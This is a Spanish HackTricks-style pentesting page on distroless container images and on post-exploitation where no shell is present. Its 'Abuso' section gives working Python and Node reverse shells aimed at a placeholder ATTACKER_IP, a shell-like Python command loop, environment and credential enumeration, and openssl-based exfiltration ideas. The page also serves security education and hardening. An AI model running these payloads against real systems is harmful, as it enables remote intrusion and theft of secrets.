# Contenedores distroless

{{#include ../../../banners/hacktricks-training.md}}

## Resumen

Una imagen de contenedor **distroless** es una imagen que incluye los **componentes mínimos de runtime necesarios para ejecutar una aplicación específica**, mientras elimina intencionalmente las herramientas usuales de la distribución como gestores de paquetes, shells y grandes colecciones de utilidades genéricas de userland. En la práctica, las imágenes distroless a menudo contienen solo el binario o runtime de la aplicación, sus bibliotecas compartidas, paquetes de certificados y una disposición de sistema de archivos muy reducida.

La idea no es que distroless sea una nueva primitiva de aislamiento del kernel. Distroless es una **estrategia de diseño de imágenes**. Cambia lo que está disponible **dentro** del sistema de archivos del contenedor, no cómo el kernel aísla el contenedor. Esa distinción importa, porque distroless refuerza el entorno principalmente reduciendo lo que un atacante puede usar después de obtener ejecución de código. No reemplaza namespaces, seccomp, capabilities, AppArmor, SELinux u otro mecanismo de aislamiento en tiempo de ejecución.

## Por qué existen las imágenes distroless

Las imágenes distroless se usan principalmente para reducir:

- el tamaño de la imagen
- la complejidad operativa de la imagen
- el número de paquetes y binarios que podrían contener vulnerabilidades
- el número de herramientas de post-exploitation disponibles para un atacante por defecto

Por eso las imágenes distroless son populares en despliegues de aplicaciones en producción. Un contenedor que no contiene shell, ni gestor de paquetes, y casi ninguna herramienta genérica suele ser más fácil de razonar operativamente y más difícil de abusar interactivamente después de una compromisión.

Ejemplos de familias de imágenes estilo distroless bien conocidas incluyen:

- Google's distroless images
- Chainguard hardened/minimal images

## Qué no significa distroless

Una imagen distroless **no** es:

- automáticamente rootless
- automáticamente non-privileged
- automáticamente read-only
- automáticamente protegida por seccomp, AppArmor, o SELinux
- automáticamente segura frente a container escape

Todavía es posible ejecutar una imagen distroless con `--privileged`, compartir namespaces del host, montajes bind peligrosos, o un runtime socket montado. En ese escenario, la imagen puede ser mínima, pero el contenedor aún puede ser catastróficamente inseguro. Distroless cambia la superficie de ataque del **userland**, no el **límite de confianza del kernel**.

## Características operativas típicas

Cuando comprometes un contenedor distroless, lo primero que sueles notar es que las suposiciones comunes dejan de ser ciertas. Puede que no haya `sh`, ni `bash`, ni `ls`, ni `id`, ni `cat`, y a veces ni siquiera un entorno basado en libc que se comporte como la tradecraft habitual espera. Esto afecta tanto a la ofensiva como a la defensa, porque la falta de herramientas hace que la depuración, la respuesta a incidentes y el post-exploitation sean diferentes.

Los patrones más comunes son:

- existe el runtime de la aplicación, pero poco más
- los payloads basados en shell fallan porque no hay shell
- los one-liners de enumeración comunes fallan porque faltan los binarios auxiliares
- las protecciones del sistema de archivos como rootfs read-only o `noexec` en ubicaciones tmpfs escribibles suelen estar presentes también

Esa combinación es la que suele llevar a la gente a hablar de "weaponizing distroless".

## Distroless y Post-Exploitation

El principal reto ofensivo en un entorno distroless no siempre es el RCE inicial. A menudo es lo que viene después. Si la carga comprometida da ejecución de código en un runtime de lenguaje como Python, Node.js, Java o Go, puede que puedas ejecutar lógica arbitraria, pero no a través de los flujos de trabajo centrados en shell que son comunes en otros objetivos Linux.

Eso significa que el post-exploitation a menudo se desplaza hacia una de tres direcciones:

1. **Usar directamente el runtime del lenguaje existente** para enumerar el entorno, abrir sockets, leer archivos o preparar payloads adicionales.
2. **Cargar tus propias herramientas en memoria** si el sistema de archivos es read-only o las ubicaciones escribibles están montadas con `noexec`.
3. **Abusar de binarios existentes ya presentes en la imagen** si la aplicación o sus dependencias incluyen algo inesperadamente útil.

## Abuso

### Enumerar el runtime que ya tienes

En muchos contenedores distroless no hay shell, pero todavía existe un runtime de aplicación. Si el objetivo es un servicio Python, Python está presente. Si el objetivo es Node.js, Node está presente. Eso a menudo proporciona suficiente funcionalidad para enumerar archivos, leer variables de entorno, abrir reverse shells y preparar ejecución en memoria sin invocar jamás `/bin/sh`.

Un ejemplo simple con Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Un ejemplo sencillo con Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impacto:

- recuperación de variables de entorno, a menudo incluyendo credenciales o endpoints de servicio
- enumeración del sistema de archivos sin `/bin/ls`
- identificación de rutas con permiso de escritura y secretos montados

### Reverse Shell sin `/bin/sh`

Si la imagen no contiene `sh` o `bash`, un reverse shell clásico basado en shell puede fallar inmediatamente. En esa situación, usa el runtime del lenguaje instalado en su lugar.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Si `/bin/sh` no existe, reemplaza la línea final con ejecución directa de comandos mediante Python o un bucle REPL de Python.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
De nuevo, si `/bin/sh` está ausente, utiliza directamente las APIs de filesystem, process y networking de Node en lugar de invocar un shell.

### Ejemplo completo: Bucle de comandos Python sin shell

Si la imagen tiene Python pero no dispone de ningún shell, un bucle interactivo sencillo suele ser suficiente para mantener la capacidad completa de post-exploitation:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Esto no requiere un binario de shell interactivo. El impacto es efectivamente el mismo que un shell básico desde la perspectiva del atacante: ejecución de comandos, enumeración y staging de payloads adicionales a través del runtime existente.

### Ejecución de herramientas en memoria

Las imágenes distroless suelen combinarse con:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

Esa combinación hace que los flujos de trabajo clásicos de "descargar un binario al disco y ejecutarlo" sean poco fiables. En esos casos, las técnicas de ejecución en memoria se convierten en la respuesta principal.

La página dedicada a eso es:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Las técnicas más relevantes allí son:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Binarios existentes en la imagen

Algunas imágenes distroless aún contienen binarios necesarios para la operación que resultan útiles tras una compromisión. Un ejemplo observado repetidamente es `openssl`, porque las aplicaciones a veces lo necesitan para tareas relacionadas con crypto o TLS.

Un patrón de búsqueda rápido es:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Si `openssl` está presente, puede ser útil para:

- conexiones TLS salientes
- exfiltración de datos a través de un canal de salida permitido
- preparar datos de payload mediante blobs codificados/encriptados

El abuso exacto depende de lo que esté realmente instalado, pero la idea general es que distroless no significa "sin herramientas en absoluto"; significa "muchas menos herramientas que una imagen de distribución normal".

## Comprobaciones

El objetivo de estas comprobaciones es determinar si la imagen es realmente distroless en la práctica y qué runtime o binarios auxiliares siguen disponibles para post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Lo interesante aquí:

- Si no existe un shell pero hay un runtime como Python o Node, la post-exploitation debe pivotar a ejecución dirigida por el runtime.
- Si el sistema de archivos raíz es de solo lectura y `/dev/shm` es escribible pero `noexec`, las técnicas de ejecución en memoria se vuelven mucho más relevantes.
- Si binarios auxiliares como `openssl`, `busybox` o `java` existen, pueden ofrecer suficiente funcionalidad para permitir obtener acceso adicional.

## Valores por defecto del runtime

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Minimal userland by design | No shell, no package manager, only application/runtime dependencies | adding debugging layers, sidecar shells, copying in busybox or tooling |
| Chainguard minimal images | Minimal userland by design | Reduced package surface, often focused on one runtime or service | using `:latest-dev` or debug variants, copying tools during build |
| Kubernetes workloads using distroless images | Depends on Pod config | Distroless affects userland only; Pod security posture still depends on the Pod spec and runtime defaults | adding ephemeral debug containers, host mounts, privileged Pod settings |
| Docker / Podman running distroless images | Depends on run flags | Minimal filesystem, but runtime security still depends on flags and daemon configuration | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

El punto clave es que distroless es una **propiedad de la imagen**, no una protección del runtime. Su valor proviene de reducir lo que está disponible dentro del sistema de archivos tras un compromiso.

## Related Pages

For filesystem and memory-execution bypasses commonly needed in distroless environments:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

For container runtime, socket, and mount abuse that still applies to distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
